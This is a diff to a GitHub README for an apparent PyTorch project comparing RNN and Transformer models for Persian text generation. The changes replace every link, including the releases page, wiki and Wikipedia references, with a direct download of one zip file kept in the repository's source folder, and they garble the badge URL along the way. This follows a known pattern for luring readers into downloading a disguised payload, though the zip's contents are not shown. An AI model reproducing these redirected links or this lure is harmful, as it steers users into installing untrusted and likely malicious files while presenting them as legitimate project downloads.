@@ -1,6 +1,6 @@
 # 🎉 pytorch-rnn-vs-transformer-persian-generation - Compare RNN and Transformer Models Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen.svg)](https://github.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip%20Latest%https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)
 
 ## 📦 Overview
 
@@ -16,7 +16,7 @@ Follow these steps to download and run the application.
 
 To start using the project, visit this page to download:
 
-[Download Latest Release](https://github.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)
 
 1. Go to the link above.
 2. Find the version you want to download. Click on it.
@@ -108,8 +108,8 @@ For additional information, see the documentation file included in the release.
 
 Here are some helpful links to further explore the project:
 
-- [GitHub Repository](https://github.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation)  
-- [Documentation](https://github.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/wiki)
-- More about [RNNs](https://en.wikipedia.org/wiki/Recurrent_neural_network) and [Transformers](https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)) on Wikipedia.
+- [GitHub Repository](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)  
+- [Documentation](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)
+- More about [RNNs](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip) and [Transformers](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip(machine_learning_model)) on Wikipedia.
 
-[Download Latest Release](https://github.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/releases) and dive into the world of text generation today.
+[Download Latest Release](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip) and dive into the world of text generation today.
